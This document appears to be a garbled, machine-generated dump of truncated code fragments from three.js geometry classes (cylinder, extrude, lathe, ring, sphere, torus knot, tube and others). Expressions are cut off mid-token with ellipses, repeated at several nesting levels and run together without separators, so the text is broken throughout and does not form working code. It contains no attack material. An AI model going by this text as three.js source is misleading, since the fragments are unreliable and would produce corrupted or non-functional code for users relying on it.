false;openEnd ... : falseopenEnd ... definedheightH ... ght / 2var x,  ... s = [];vertices = []for ( y ... ;\r\n\r\n\t}y <= heightSegmentsvar ver ... w = [];verticesRow = []var uvsRow = [];uvsRow = []var v = ... gments;v = y / ... egmentsy / heightSegmentsvar rad ... iusTop;radius  ... diusTopv * ( r ... diusTopv * ( r ... usTop )( radiu ... usTop )radiusB ... diusTopfor ( x ... \r\n\r\n\t\t}x <= radialSegmentsvar u = ... gments;u = x / ... egmentsx / radialSegmentsvertex. ...  * 2 );vertex. ... I * 2 )radius  ... I * 2 )Math.si ... I * 2 )u * Math.PI * 2u * Math.PIvertex. ... htHalf;vertex. ... ghtHalf- v * h ... ghtHalf- v * height- vMath.co ... I * 2 )vertice ...  - 1 );vertice ... h - 1 )verticesRow.pushthis.ve ... gth - 1uvsRow. ...  v ) );uvsRow. ... - v ) )uvsRow.pushnew THR ... 1 - v )1 - vvertice ... sRow );vertice ... esRow )vertices.pushuvs.push( uvsRow );uvs.push( uvsRow )var tan ... height;tanThet ...  height( radiu ...  heightvar na, nb;for ( x ... }\r\n\r\n\t}x < radialSegmentsif ( ra ... \r\n\r\n\t\t}radiusTop !== 0na = th ... lone();na = th ... clone()this.ve ... [ x ] ]vertices[ 0 ][ x ]nb = th ... lone();nb = th ... clone()this.ve ... + 1 ] ]vertice ... x + 1 ]vertices[ 1 ][ x ]vertices[ 1 ]na.setY ... lize();na.setY ... alize()na.setY ... rmalizena.setY ... Theta )na.setYMath.sq ... anThetaMath.sq ...  na.z )na.x *  ...  * na.zna.x * na.xna.xna.z * na.zna.znb.setY ... lize();nb.setY ... alize()nb.setY ... rmalizenb.setY ... Theta )nb.setYMath.sq ...  nb.z )nb.x *  ...  * nb.znb.x * nb.xnb.xnb.z * nb.znb.zfor ( y ... \r\n\r\n\t\t}y < heightSegmentsvar v1  ... ][ x ];v1 = ve ...  ][ x ]vertices[ y ][ x ]vertices[ y ]var v2  ... ][ x ];v2 = ve ...  ][ x ]vertice ...  ][ x ]vertices[ y + 1 ]var v3  ...  + 1 ];v3 = ve ... x + 1 ]var v4  ...  + 1 ];v4 = ve ... x + 1 ]var n1 = na.clone();n1 = na.clone()na.clone()na.clonevar n2 = na.clone();n2 = na.clone()var n3 = nb.clone();n3 = nb.clone()nb.clone()nb.clonevar n4 = nb.clone();n4 = nb.clone()var uv1 ... lone();uv1 = u ... clone()uvs[ y  ... clone()uvs[ y ][ x ].cloneuvs[ y ][ x ]uvs[ y ]var uv2 ... lone();uv2 = u ... clone()uvs[ y  ... ].cloneuvs[ y + 1 ][ x ]uvs[ y + 1 ]var uv3 ... lone();uv3 = u ... clone()uvs[ y  ... x + 1 ]var uv4 ... lone();uv4 = u ... clone()uvs[ y ][ x + 1 ]this.fa ... 4 ] ) )new THR ...  n4 ] )[ n1, n2, n4 ]this.fa ... v4 ] );this.fa ... uv4 ] )[ uv1, uv2, uv4 ][ n2.cl ... one() ]n2.clone()n2.clonen4.clone()n4.clone[ uv2.c ... one() ]uv2.clone()uv2.cloneuv4.clone()uv4.cloneif ( op ... }\r\n\r\n\t}openEnd ... Top > 0openEnded === falseradiusTop > 0this.ve ...  0 ) );this.ve ... , 0 ) )new THR ... lf, 0 )var v2  ...  + 1 ];v2 = ve ... x + 1 ]var v3  ... th - 1;v3 = th ... gth - 1var n1  ... 1, 0 );n1 = ne ...  1, 0 )var n2  ... 1, 0 );n2 = ne ...  1, 0 )var n3  ... 1, 0 );n3 = ne ...  1, 0 )uvs[ 0  ... clone()uvs[ 0 ][ x ].cloneuvs[ 0 ][ x ]uvs[ 0 ]uvs[ 0  ... ].cloneuvs[ 0 ][ x + 1 ]var uv3 ... x, 0 );uv3 = n ... .x, 0 )new THR ... .x, 0 )uv2.xthis.fa ... 3 ] ) )new THR ...  n3 ] )[ n1, n2, n3 ]this.fa ... v3 ] );this.fa ... uv3 ] )[ uv1, uv2, uv3 ]openEnd ... tom > 0radiusBottom > 0- heightHalfvar v1  ...  + 1 ];v1 = ve ... x + 1 ]var uv3 ... x, 1 );uv3 = n ... .x, 1 )new THR ... .x, 1 )if ( ty ... rn;\r\n\t}typeof( ... efined"typeof( shapes )( shapes ){\r\n\t\tsh ... rn;\r\n\t}shapes = [];shapes  ... apes ];shapes  ... hapes ]shapes  ... f Array[ shapes ]this.sh ... gBox();this.sh ... ngBox()this.shapebbshapes[ ... ngBox()shapes[ ... dingBoxshapes[ ... h - 1 ]shapes.length - 1shapes.lengththis.ad ... ions );this.ad ... tions )this.addShapeListTHREE.E ... \n\t}\r\n};THREE.E ... \r\n\t}\r\n}THREE.E ... apeListfunctio ... \r\n\t}\r\n}{\r\n\tvar ... \r\n\t}\r\n}var sl  ... length;sl = shapes.lengths < sls ++var sha ... s[ s ];shape = shapes[ s ]shapes[ s ]this.addShapeTHREE.E ... ddShapevar amo ...  : 100;amount  ... t : 100options ... t : 100options.amountvar bev ... ss : 6;bevelTh ... ess : 6options ... ess : 6options ... icknessvar bev ... ss - 2;bevelSi ... ess - 2options ... ess - 2options.bevelSizebevelThickness - 2var bev ... ts : 3;bevelSe ... nts : 3options ... nts : 3options ... egmentsvar bev ... : true;bevelEn ...  : trueoptions.bevelEnabledvar cur ... s : 12;curveSe ... ts : 12options ... ts : 12var ste ... ps : 1;steps = ... eps : 1options ... eps : 1options.stepsvar ext ... dePath;extrude ... udePathoptions.extrudePathvar ext ...  false;extrude ... = falseoptions.materialvar ext ... terial;extrude ... aterialoptions ... aterialvar uvg ... erator;uvgen = ... neratoroptions ... neratoroptions.UVGeneratorTHREE.E ... neratorvar sha ... hapebb;shapebb ... shapebbvar spl ... ition2;if ( ex ... ;\r\n\r\n\t}extrude ... teps );extrude ... steps )extrude ... dPointsextrude ... = true;extrudeByPath = truebevelEn ...  false;bevelEnabled = falsesplineT ... false);splineT ...  false)options ...  false)options.framesnew THR ...  false)THREE.T ... tFramesTHREE.TubeGeometrybinorma ... tor3();binorma ... ctor3()normal  ... tor3();positio ... tor3();positio ... ctor3()if ( !  ... ;\r\n\r\n\t}! bevelEnabledbevelSegments = 0;bevelSegments = 0bevelThickness = 0;bevelThickness = 0bevelSize = 0;bevelSize = 0var ahole, h, hl;var bev ... s = [];bevelPoints = []var sha ... length;shapesO ... .lengthvar sha ... ents );shapePo ... ments )shape.e ... ments )shape.extractPointsvar ver ... .shape;vertice ... s.shapeshapePoints.shapevar hol ... .holes;holes = ... s.holesshapePoints.holesvar rev ... ces ) ;reverse ... tices )!THREE. ... tices )THREE.S ... tices )if ( re ... !\r\n\r\n\t}{\r\n\r\n\t\t ... !\r\n\r\n\t}vertice ... erse();vertice ... verse()vertices.reverse()vertices.reverseh = 0,  ... .lengthahole = holes[ h ];ahole = holes[ h ]holes[ h ]if ( TH ... \n\r\n\t\t\t}THREE.S ... ahole )holes[  ... erse();holes[  ... verse()ahole.reverse()ahole.reversereverse = false;reverse = falsevar fac ... oles );faces = ... holes )THREE.S ... holes )THREE.S ... teShapevar con ... rtices;contour = verticesfor ( h ... ;\r\n\r\n\t}vertice ... hole );vertice ... ahole )vertices.concatif ( !v ... die" );!vecconsole ... die" );console.log( "die" )diereturn  ... ( pt );vec.clo ... d( pt )vec.clo ... e ).addvec.clo ...  size )vec.clo ... yScalarvec.clone()vec.clonevar b,  ... length;flen = faces.lengthclen =  ... .lengthvar RAD ... ath.PI;RAD_TO_ ... Math.PIvar sig ... h.sign;sign =  ... th.signTHREE.Math.signvar v_t ... by = 1;shrink_by = 1var v_p ... Prev.y;v_prev_ ... nPrev.xinPt.x - inPrev.xinPrev.xv_prev_ ... nPrev.yinPt.y - inPrev.yinPrev.yvar v_n ... inPt.y;v_next_ ...  inPt.xinNext.x - inPt.xinNext.xv_next_ ...  inPt.yinNext.y - inPt.yinNext.yvar v_p ... ev_y );v_prev_ ... rev_y )( v_pre ... rev_y )v_prev_ ... _prev_yv_prev_x * v_prev_xv_prev_y * v_prev_yvar col ... xt_x );colinea ... ext_x )( v_pre ... ext_x )v_prev_ ... _next_xv_prev_x * v_next_yv_prev_y * v_next_xMath.ab ... near0 ){\t\t// n ... \t\t\r\n\t\t}var v_p ... ensq );v_prev_ ... lensq )Math.sq ... lensq )var v_n ... xt_y );v_next_ ... ext_y )Math.sq ... ext_y )v_next_ ... _next_yv_next_x * v_next_xv_next_y * v_next_yvar ptP ... _len );ptPrevS ... v_len )( inPre ... v_len )inPrev. ... rev_lenv_prev_ ... rev_lenvar ptN ... _len );ptNextS ... t_len )( inNex ... t_len )inNext. ... ext_lenv_next_ ... ext_lenvar sf  ... xt_x );sf = (  ... ext_x )(  ( pt ... ext_x )(  ( pt ... _x    )( ptNex ... _next_x( ptNex ... _next_y( ptNex ... ift_x )ptNextS ... Shift_x( ptNex ... ift_y )ptNextS ... Shift_yv_trans ... Pt.x );v_trans ... nPt.x )( ptPre ... nPt.x )ptPrevS ...  inPt.xptPrevS ... _x * sfv_prev_x * sfv_trans ... Pt.y );v_trans ... nPt.y )( ptPre ... nPt.y )ptPrevS ...  inPt.yptPrevS ... _y * sfv_prev_y * sfvar v_t ... ans_y )v_trans ... ans_y )( v_tra ... ans_y )v_trans ... trans_yv_trans ... trans_xif ( v_ ... ;\r\n\t\t\t}v_trans_lensq <= 2return\t ... ns_y );new THR ... ans_y )shrink_ ...  / 2 );shrink_ ... q / 2 )Math.sq ... q / 2 )v_trans_lensq / 2{\t\t// h ... \r\n\r\n\t\t}var dir ...  false;direction_eq = falseif ( v_ ... }\r\n\t\t\t}v_prev_x > EPSILONif ( v_ ... true; }v_next_x > EPSILON{ direc ... true; }direction_eq = true;direction_eq = trueif ( v_ ... \r\n\t\t\t\t}v_prev_x < -EPSILONv_next_x < -EPSILONif ( si ... true; }sign(v_ ... next_y)sign(v_prev_y)sign(v_next_y)if ( di ... ;\r\n\t\t\t}v_trans ... prev_y;v_trans ... _prev_y-v_prev_yv_trans ... prev_x;v_trans ... _prev_xshrink_ ... ensq );shrink_ ... lensq )v_trans_x = v_prev_xv_trans_y = v_prev_yv_prev_lensq / 2return\t ... k_by );new THR ... nk_by )v_trans ... rink_byvar con ... s = [];contour ... ts = []i ++, j ++, k ++var i = ... = i + 1il = contour.lengthj = il - 1k = i + 1if ( j  ...  j = 0;j === ilj = 0;if ( k  ...  k = 0;k === ilk = 0;var pt_ ... r[ i ];pt_i = contour[ i ]contour[ i ]var pt_ ... r[ j ];pt_j = contour[ j ]contour[ j ]var pt_ ... r[ k ];pt_k = contour[ k ]contour[ k ]contour ...  k ] );contour ... [ k ] )contour ... ts[ i ]getBeve ... [ k ] )var hol ... ncat();holesMovements = []vertice ... oncat()contour ... oncat()contour ... .concatoneHole ... s = [];oneHole ... ts = []i = 0,  ... = i + 1il = ahole.lengthahole.lengthoneHole ...  k ] );oneHole ... [ k ] )oneHole ... ts[ i ]ahole[ i ]ahole[ j ]ahole[ k ]holesMo ... ents );holesMo ... ments )holesMovements.pushvertice ... ents );vertice ... ments )vertice ... .concatfor ( b ... }\r\n\r\n\t}b < bevelSegments{\r\n\t//f ... }\r\n\r\n\t}t = b / ... gments;t = b / ... egmentsb / bevelSegmentsz = bev ...  - t );z = bev ... 1 - t )bevelTh ... 1 - t )bs = be ... 2 ) ) ;bs = be ... I/2 ) )bevelSi ... I/2 ) )( Math. ... I/2 ) )Math.si ... .PI/2 )t * Math.PI/2t * Math.PIvert =  ... , bs );vert =  ... ], bs )scalePt ... ], bs )v( vert ...  - z );v( vert ...   - z )vert.xvert.y- zoneHole ... s[ h ];oneHole ... ts[ h ]holesMovements[ h ]v( vert ...   -z );v( vert ... ,  -z )bs = bevelSize;bs = bevelSizei < vlenvert =  ... s[ i ];vert =  ... es[ i ]bevelEn ... es[ i ]vertice ... ts[ i ]if ( !e ... \r\n\r\n\t\t}!extrudeByPathv( vert ... y, 0 );v( vert ... .y, 0 )normal. ... ert.x);normal. ... vert.x)normal. ... ls[0] )normal.copysplineT ... mals[0]splineTube.normalsbinorma ... ert.y);binorma ... vert.y)binorma ... yScalarbinorma ... ls[0] )binormal.copysplineTube.binormalspositio ... ormal);positio ... normal)positio ... al).addpositio ... ] ).addpositio ... ts[0] )position2.copyextrudePts[0]v( posi ... n2.z );v( posi ... on2.z )position2.xposition2.yposition2.zvar s;for ( s ... }\r\n\r\n\t}s <= stepsif ( !e ... \n\r\n\t\t\t}v( vert ...  * s );v( vert ... s * s )amount / steps * samount / stepsnormal. ... rt.x );normal. ... ert.x )normal. ... ls[s] )splineT ... mals[s]binorma ... rt.y );binorma ... ert.y )binorma ... ls[s] )positio ... rmal );positio ... ormal )positio ... l ).addpositio ... ts[s] )extrudePts[s]b >= 0b --b = bev ... nts - 1bevelSegments - 1bs = be ... I/2 ) ;bs = be ... .PI/2 )bevelSi ... .PI/2 )v( vert ...  + z );v( vert ... t + z )amount + zif ( !e ... \r\n\t\t\t\t}v( vert ... x + z )vert.y  ... - 1 ].yextrude ... - 1 ].yextrude ... s - 1 ]steps - 1extrude ... ].x + zextrude ... - 1 ].xbuildLidFaces();buildLidFaces()buildSideFaces();buildSideFaces()if ( be ... \t}\r\n\t\t}var layer = 0 ;layer = 0var off ...  layer;offset  ... * layervlen * layeri < flenf3( fac ... true );f3( fac ...  true )face[ 2 ]+ offsetface[ 2 ]face[ 1 ]+ offsetface[ 1 ]face[ 0 ] + offsetface[ 0 ]layer = ... ts * 2;layer = ... nts * 2steps + ... nts * 2bevelSegments * 2offset  ...  layer;f3( fac ... alse );f3( fac ... false )face[ 1 ] + offsetface[ 2 ] + offsetface[ 0 ... * stepsvlen * stepsface[ 1 ... * stepsface[ 2 ... * stepsvar layeroffset = 0;layeroffset = 0sidewal ... fset );sidewal ... ffset )layerof ... length;layerof ... .lengthvar j, k;i = contour.length;i = contour.lengthwhile ( ... \t}\r\n\t\t}--i >= 0--ij = i;j = ik = i - 1;k = i - 1if ( k  ... th - 1;k < 0k = con ... th - 1;k = con ... gth - 1contour.length - 1var s = ... ts * 2;sl = st ... nts * 2steps   ... nts * 2for ( s ... \n\r\n\t\t\t}var sle ... en * s;slen1 = vlen * svlen * svar sle ...  + 1 );slen2 = ... s + 1 )vlen * ( s + 1 )( s + 1 )s + 1var a = ...  slen2;a = lay ... + slen1layerof ... + slen1layeroffset + jb = lay ... + slen1layeroffset + kc = lay ... + slen2layerof ... + slen2d = lay ... + slen2f4( a,  ... j, k );f4( a,  ...  j, k )scope.v ...  z ) );scope.v ... , z ) )new THR ...  y, z )a += shapesOffset;a += shapesOffsetb += shapesOffset;b += shapesOffsetc += shapesOffset;c += shapesOffsetscope.f ... al ) );scope.f ... ial ) )var uvs ... b, c );uvs = i ...  b, c )isBotto ...  b, c )uvgen.g ...  b, c )uvgen.g ... ottomUVuvgen.generateTopUVscope.f ...  uvs );scope.f ... ( uvs )d += shapesOffset;d += shapesOffsetvar uvs ... dex2 );uvs = u ... ndex2 )uvgen.g ... ndex2 )uvgen.g ... eWallUVscope.f ...  ] ] );scope.f ... 3 ] ] )[ uvs[  ... [ 3 ] ]uvs[ 1 ]uvs[ 3 ]uvs[ 2 ]{\r\n\r\n\tg ... \r\n\t}\r\n}var ax  ... xC ].y;ax = ge ... exA ].xgeometr ... exA ].xgeometr ... ndexA ]ay = ge ... exA ].ygeometr ... exA ].ybx = ge ... exB ].xgeometr ... exB ].xgeometr ... ndexB ]by = ge ... exB ].ygeometr ... exB ].ycx = ge ... exC ].xgeometr ... exC ].xgeometr ... ndexC ]cy = ge ... exC ].ygeometr ... exC ].yreturn  ... )\r\n\t\t];[\r\n\t\t\tn ...  )\r\n\t\t]new THR ... x, ay )new THR ... x, by )new THR ... x, cy )return  ... dexC );this.ge ... ndexC )this.generateTopUVgenerat ... \t\t}\r\n\t}var ax  ... xD ].z;az = ge ... exA ].zgeometr ... exA ].zbz = ge ... exB ].zgeometr ... exB ].zcz = ge ... exC ].zgeometr ... exC ].zdx = ge ... exD ].xgeometr ... exD ].xgeometr ... ndexD ]dy = ge ... exD ].ygeometr ... exD ].ydz = ge ... exD ].zgeometr ... exD ].zif ( Ma ... ];\r\n\t\t}Math.ab ...  < 0.01Math.abs( ay - by )ay - by{\r\n\t\t\tr ... ];\r\n\t\t}return  ... \r\n\t\t\t];[\r\n\t\t\t\t ... )\r\n\t\t\t]new THR ...  - az )1 - aznew THR ...  - bz )1 - bznew THR ...  - cz )1 - cznew THR ...  - dz )1 - dzTHREE.E ... tor2();THREE.E ... ctor2()THREE.E ... ry.__v1THREE.E ... ry.__v2THREE.E ... ry.__v3THREE.E ... ry.__v4THREE.E ... ry.__v5THREE.E ... ry.__v6if ( sh ... apes ];shapes  ... = falseshapes = [ shapes ];shapes = [ shapes ]THREE.S ... apeListl = shapes.lengthshapes[ i ]THREE.S ... ddShapeif ( op ... s = {};options = {};options = {}var i, l, hole, s;var rev ... ices );l = holes.lengthhole = holes[ i ];hole = holes[ i ]holes[ i ]THREE.S ...  hole )hole.reverse()hole.reversevertice ...  hole )var ver ... length;var fac ... length;var con ... length;vert = vertices[ i ]new THR ... .y, 0 )var a = ... Offset;a = fac ... sOffsetface[ 0 ... sOffsetvar b = ... Offset;b = fac ... sOffsetface[ 1 ... sOffsetvar c = ... Offset;c = fac ... sOffsetface[ 2 ... sOffsetthis.fa ... al ) );this.fa ... ial ) )this.fa ...  c ) );this.fa ... , c ) )THREE.LatheGeometrysegment ...  || 12;segment ... s || 12segments || 12phiStar ... t || 0;phiStar ... rt || 0phiStart || 0phiLeng ... ath.PI;phiLeng ... Math.PIvar inv ...  - 1 );inverse ... h - 1 )1.0 / ( ... h - 1 )var inv ... gments;inverse ... egments1.0 / segmentsi <= ilvar i = ... egmentsil = segmentsvar phi ... Length;phi = p ... iLengthphiStar ... iLengthi * inv ... iLengthi * inverseSegmentsvar c = ...  phi );c = Math.cos( phi )s = Math.sin( phi )jl = points.lengthvar pt  ... s[ j ];pt = points[ j ]points[ j ]vertex. ... * pt.y;vertex. ...  * pt.yc * pt.x - s * pt.yc * pt.xpt.xs * pt.ypt.ys * pt.x + c * pt.ys * pt.xc * pt.yvertex.z = pt.z;vertex.z = pt.zpt.zvar np  ... length;np = points.lengthvar j = ... gth - 1jl = po ... gth - 1var bas ... np * i;base = j + np * ij + np * inp * ivar a = base;a = basevar b = base + np;b = base + npbase + npvar c = ... 1 + np;c = base + 1 + npbase + 1 + npbase + 1var d = base + 1;d = base + 1var u0  ... gments;u0 = i  ... egmentsvar v0  ... Length;v0 = j  ... tLengthj * inv ... tLengthvar u1  ... gments;u1 = u0 ... egmentsu0 + inverseSegmentsvar v1  ... Length;v1 = v0 ... tLengthv0 + in ... tLengththis.fa ...  d ) );this.fa ... , d ) )new THR ...  b, d )this.fa ... \t\t\t] );this.fa ... \n\t\t\t] )new THR ... 0, v0 )new THR ... 1, v0 )new THR ... 0, v1 )new THR ... 1, v1 )var ix, iz;var gri ... s || 1;gridX = ... ts || 1gridZ = ... ts || 1var gri ... dX + 1;var gri ... dZ + 1;gridZ1 = gridZ + 1gridZ + 1var seg ...  gridX;var seg ...  gridZ;segment ... / gridZheight / gridZvar nor ... 0, 1 );normal  ...  0, 1 )iz < gridZ1iz ++iz = 0var y = ... t_half;y = iz  ... ht_halfiz * se ... ht_halfiz * segment_heightvar x = ... h_half;x = ix  ... th_halfnew THR ...  y, 0 )- yiz < gridZvar a = ... 1 * iz;a = ix + gridX1 * izix + gridX1 * izgridX1 * izb = ix  ... z + 1 )ix + gr ... z + 1 )gridX1 * ( iz + 1 )( iz + 1 )iz + 1c = ( i ... z + 1 )( ix +  ... z + 1 )var d = ... 1 * iz;d = ( i ... X1 * iz( ix +  ... X1 * izvar uva ... ridZ );uva = n ... gridZ )new THR ... gridZ )1 - iz / gridZiz / gridZvar uvb ... ridZ );uvb = n ... gridZ )1 - ( i ... / gridZ( iz + 1 ) / gridZvar uvc ... ridZ );uvc = n ... gridZ )var uvd ... ridZ );uvd = n ... gridZ )var fac ... b, d );face =  ...  b, d )this.fa ... face );this.fa ...  face )this.fa ... vd ] );this.fa ... uvd ] )face =  ... c, d );face =  ...  c, d )THREE.RingGeometryinnerRa ... s || 0;innerRa ... us || 0innerRadius || 0outerRa ...  || 50;outerRa ... s || 50outerRadius || 50thetaSe ...  ) : 8;thetaSe ... s ) : 8thetaSe ... definedphiSegm ...  ) : 8;phiSegm ... s ) : 8phiSegm ... definedvar i,  ... ents );radius = innerRadiusradiusS ... ments )( ( out ... ments )( outer ... egments( outer ... adius )outerRa ... rRadiusi <= phiSegments{ // co ... ;\r\n\r\n\t}for ( o ... );\r\n\t\t}o <= thetaSegments{ // nu ... );\r\n\t\t}o / the ... aLengtho / thetaSegmentsvertex. ... rRadiusradius  ... usStep;radius += radiusStepi < phiSegments{ // co ... \t\t}\r\n\t}var the ... gments;thetaSe ... egmentsi * thetaSegmentsfor ( o ... \r\n\r\n\t\t}{ // nu ... \r\n\r\n\t\t}var seg ... egment;segment ... Segmento + thetaSegmentvar v1  ... nt + i;v1 = segment + isegment + ivar v2  ... ts + i;v2 = se ... nts + isegment ... nts + isegment ... egmentsvar v3  ...  1 + i;v3 = se ... + 1 + isegment ... + 1 + isegment ... nts + 1this.fa ... e() ]);this.fa ... ne() ])uvs[ v1 ].clone()uvs[ v1 ].cloneuvs[ v1 ]uvs[ v2 ].clone()uvs[ v2 ].cloneuvs[ v2 ]uvs[ v3 ].clone()uvs[ v3 ].cloneuvs[ v3 ]v1 = segment + i;v2 = se ...  1 + i;v2 = se ... + 1 + iv3 = se ...  1 + i;v3 = segment + 1 + isegment + 1 + isegment + 1this.pa ... h \r\n\t};this.pa ... th \r\n\t}{\r\n\t\tra ... th \r\n\t}phiStart: phiStartphiLength: phiLengthwidthSe ... || 8 );widthSe ...  || 8 )Math.ma ...  || 8 )Math.fl ...  ) || 8Math.fl ... ments )heightS ... || 6 );heightS ...  || 6 )Math.ma ...  || 6 )Math.fl ...  ) || 6phiStar ... rt : 0;phiStar ... art : 0phiStar ... definedphiLeng ... PI * 2;phiLeng ... .PI * 2phiLeng ... definedthetaLe ... ath.PI;thetaLe ... Math.PIx <= widthSegmentsx / widthSegmentsvertex. ... ngth );vertex. ... ength )- radiu ... ength )- radiusMath.co ... ength )u * phiLengthMath.si ... ength )v * thetaLengthradius  ... ength )for ( y ... }\r\n\r\n\t}x < widthSegmentsvar v3  ... ][ x ];v3 = ve ...  ][ x ]var n1  ... lize();n1 = th ... alize()this.ve ... alize()this.ve ... rmalizethis.vertices[ v1 ]var n2  ... lize();n2 = th ... alize()this.vertices[ v2 ]var n3  ... lize();n3 = th ... alize()this.vertices[ v3 ]var n4  ... lize();n4 = th ... alize()this.vertices[ v4 ]Math.ab ...  radiusMath.ab ... 1 ].y )this.ve ...  v1 ].yuv1.x = ...  ) / 2;uv1.x = ... x ) / 2uv1.x( uv1.x ... x ) / 2( uv1.x + uv2.x )uv1.x + uv2.x[ n1, n3, n4 ][ uv1, uv3, uv4 ]Math.ab ... 3 ].y )this.ve ...  v3 ].yuv3.x = ...  ) / 2;uv3.x = ... x ) / 2uv3.x( uv3.x ... x ) / 2( uv3.x + uv4.x )uv3.x + uv4.xuv4.xTHREE.TextGeometry{\r\n\r\n\tp ... );\r\n\r\n}var tex ... ters );textSha ... eters )THREE.F ... eters )paramet ... t : 50;paramet ... ht : 50parameters.amountparameters.heightif ( pa ... s = 10;paramet ... icknessparamet ... s = 10;paramet ... ss = 10if ( pa ... ze = 8;parameters.bevelSizeparamet ... ze = 8;paramet ... ize = 8if ( pa ...  false;paramet ...  false;paramet ... = falseTHREE.E ... ters );THREE.E ... eters )THREE.E ... ry.callTHREE.T ... type );THREE.T ... otype )this.pa ... rc\r\n\t};this.pa ... arc\r\n\t}{\r\n\t\tra ... arc\r\n\t}tube: tubetubular ... egmentsarc: arcradius  ... || 100;radius  ...  || 100radius || 100tube = tube || 40;tube = tube || 40tube || 40tubular ... s || 6;tubular ... ts || 6tubularSegments || 6arc = a ... PI * 2;arc = a ... .PI * 2arc || Math.PI * 2var cen ... s = [];j <= radialSegmentsi <= tubularSegmentsvar u = ...  * arc;u = i / ... s * arci / tub ... s * arci / tubularSegmentsvar v = ... PI * 2;v = j / ... .PI * 2j / rad ... .PI * 2j / rad ... Math.PIj / radialSegmentscenter. ... s( u );center. ... os( u )center.xradius  ... os( u )Math.cos( u )center. ... n( u );center. ... in( u )center.yradius  ... in( u )Math.sin( u )vertex. ... s( u );vertex. ... os( u )( radiu ... os( u )( radiu ... ( v ) )radius  ... os( v )tube * Math.cos( v )Math.cos( v )vertex. ... n( u );vertex. ... in( u )( radiu ... in( u )vertex. ... n( v );vertex. ... in( v )tube * Math.sin( v )Math.sin( v )uvs.pus ... ts ) );uvs.pus ... nts ) )normals ... ze() );normals ... ize() )vertex. ... alize()vertex. ... rmalizevertex. ... enter )vertex.clone().subvar j = 1var i = 1var a = ...  i - 1;a = ( t ... + i - 1( tubul ... + i - 1( tubul ... * j + i( tubul ... 1 ) * j( tubul ... s + 1 )tubularSegments + 1var b = ...  i - 1;b = ( t ... + i - 1( tubul ... 1 ) + i( tubul ... j - 1 )( j - 1 )j - 1var c = ...  ) + i;c = ( t ... 1 ) + ivar d = ...  j + i;d = ( t ... * j + ivar fac ... () ] );face =  ... e() ] )[ norma ... one() ]normals[ a ].clone()normals[ a ].clonenormals[ a ]normals[ b ].clone()normals[ b ].clonenormals[ b ]normals[ d ].clone()normals[ d ].clonenormals[ d ]uvs[ a ].clone()uvs[ a ].cloneuvs[ a ]uvs[ b ].clone()uvs[ b ].cloneuvs[ b ]uvs[ d ].clone()uvs[ d ].cloneuvs[ d ]face =  ... () ] );normals[ c ].clone()normals[ c ].clonenormals[ c ]uvs[ c ].clone()uvs[ c ].cloneuvs[ c ]this.pa ... le\r\n\t};this.pa ... ale\r\n\t}{\r\n\t\tra ... ale\r\n\t}p: pq: qheightS ... htScaleradialS ...  || 64;radialS ... s || 64radialSegments || 64tubular ... s || 8;tubular ... ts || 8tubularSegments || 8p = p || 2;p = p || 2p || 2q = q || 3;q = q || 3q || 3heightS ... e || 1;heightS ... le || 1heightScale || 1var gri ... ents );grid =  ... ments )new Arr ... ments )var tan ... tor3();tang =  ... ctor3()var bit ... tor3();bitan = ... ctor3()i < radialSegmentsgrid[ i ... ents );grid[ i ... ments )grid[ i ]var u = ... ath.PI;u = i / ... Math.PIi / rad ... Math.PIi / rad ... * 2 * pi / rad ... nts * 2i / radialSegmentsvar p1  ... cale );p1 = ge ... Scale )getPos( ... Scale )var p2  ... cale );p2 = ge ... Scale )u + 0.01tang.su ... , p1 );tang.su ... 2, p1 )tang.subVectorsn.addVe ... , p1 );n.addVe ... 2, p1 )n.addVectorsbitan.c ... g, n );bitan.c ... ng, n )bitan.crossVectorsn.cross ... tang );n.cross ...  tang )n.crossVectorsbitan.normalize();bitan.normalize()bitan.normalizen.normalize();n.normalize()n.normalizej < tubularSegmentsvar v = ... ath.PI;v = j / ... Math.PIj / tub ... Math.PIj / tub ... nts * 2j / tubularSegmentsvar cx  ... s( v );cx = -  ... os( v )- tube  ... os( v )- tubevar cy  ... n( v );cy = tu ... in( v )var pos ... tor3();pos = n ... ctor3()pos.x = ... itan.x;pos.x = ... bitan.xpos.xp1.x +  ... bitan.xp1.x + cx * n.xcx * n.xcy * bitan.xbitan.xpos.y = ... itan.y;pos.y = ... bitan.ypos.yp1.y +  ... bitan.yp1.y + cx * n.ycx * n.ycy * bitan.ybitan.ypos.z = ... itan.z;pos.z = ... bitan.zpos.zp1.z +  ... bitan.zp1.z + cx * n.zcx * n.zcy * bitan.zbitan.zgrid[ i ...  ) - 1;grid[ i ... s ) - 1grid[ i ][ j ]this.ve ... s ) - 1this.ve ... ( pos )for ( v ... \t\t}\r\n\t}var ip  ... gments;ip = (  ... egments( i + 1 ... egmentsvar jp  ... gments;jp = (  ... egments( j + 1 ... egments( j + 1 )var a = ... ][ j ];a = grid[ i ][ j ]var b = ... ][ j ];b = grid[ ip ][ j ]grid[ ip ][ j ]grid[ ip ]var c = ... [ jp ];c = grid[ ip ][ jp ]grid[ ip ][ jp ]var d = ... [ jp ];d = grid[ i ][ jp ]grid[ i ][ jp ]var uva ... ents );uva = n ... ments )var uvb ... ents );uvb = n ... ments )var uvc ... ents );uvc = n ... ments )var uvd ... ents );uvd = n ... ments )var cu  ... s( u );cu = Math.cos( u )var su  ... n( u );su = Math.sin( u )var quO ... _p * u;quOverP ... n_p * uin_q / in_p * uin_q / in_pvar cs  ... verP );cs = Ma ... OverP )Math.cos( quOverP )var tx  ... 5 * cu;tx = ra ... .5 * curadius  ... .5 * curadius  ... ) * 0.5radius * ( 2 + cs )( 2 + cs )2 + csvar ty  ...  * 0.5;ty = ra ... u * 0.5radius  ... u * 0.5radius  ...  ) * suvar tz  ...  * 0.5;tz = he ... ) * 0.5heightS ... ) * 0.5heightS ... OverP )heightScale * radiusMath.sin( quOverP )this.pa ... sed\r\n\t}{\r\n\t\tpa ... sed\r\n\t}path: pathclosed: closedsegment ...  || 64;segment ... s || 64segments || 64radius  ... s || 1;radius = radius || 1radius || 1closed  ...  false;closed  ... | falseclosed || falsevar grid = [];grid = []var sco ... c, uvd;numpoin ... nts + 1segments + 1pos2 =  ... ctor3()var fra ... ormals;frames  ... losed )new THR ... losed )tangent ... angentsframes.tangentsframes.normalsbinorma ... normalsframes.binormalsthis.ta ... ngents;this.ta ... angentsthis.tangentsthis.no ... ormals;this.no ... normalsthis.normalsthis.bi ... ormals;this.bi ... normalsthis.binormalsreturn  ...  ) - 1;scope.v ... ) ) - 1i < numpointsgrid[ i ] = [];grid[ i ] = []u = i / ...  - 1 );u = i / ... s - 1 )i / ( n ... s - 1 )( numpoints - 1 )numpoints - 1pos = p ... t( u );pos = p ... At( u 